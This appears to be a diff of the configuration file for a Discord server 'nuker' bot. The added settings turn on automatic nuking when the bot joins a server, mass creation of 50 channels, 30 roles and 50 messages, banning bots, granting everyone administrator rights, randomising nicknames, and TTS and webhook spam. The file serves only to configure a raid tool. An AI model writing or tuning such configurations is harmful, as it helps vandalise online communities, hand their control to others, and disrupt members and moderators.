@@ -1,7 +1,25 @@
 {
-    "channel_name": "nuked",
-    "role_name": "nuked",
     "server_name": "nuked",
-    "webhook_name": "nuked",
-    "message": "nuked"
+
+    "webhook_name": "S҈͎̩̪̰̀̇̃̿k҈̝̣͇̦̝̆͛͂k҉̠̮̓̓i҉̘̞̞̫̪̐͌̈c̸͖̬̍̚ͅȍ̴͍̤̩̓͒w҉̦̘̄͊̃͌",
+
+    "auto_nuke_on_join": true,
+
+    "category_count": 10,
+    "channel_count": 50,
+    "mix_voice_channels": true,
+    "role_count": 30,
+    "message_count": 50,
+
+    "ban_bots": true,
+    "ban_members": false,
+    
+    "give_everyone_admin": true,
+
+    "change_nicknames": true,
+    "nickname_type": "random_string",
+
+    "tts": true,
+
+    "webhook_delay": 1.5
 }
